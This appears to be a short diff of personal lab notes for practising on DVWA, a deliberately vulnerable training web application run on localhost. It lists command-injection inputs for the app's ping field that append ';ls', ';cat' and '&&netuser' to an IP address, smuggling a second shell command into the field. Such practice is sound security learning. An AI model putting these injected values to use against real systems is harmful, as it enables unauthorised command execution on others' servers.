@@ -1,0 +1,3 @@
+sudo service apache2 start
+http://localhost/DVWA
+ip:127.0.0.1,,ip:127.0.0.1;ls,,ip:127.0.0.1;cat,,ip:127.0.0.1&&netuser
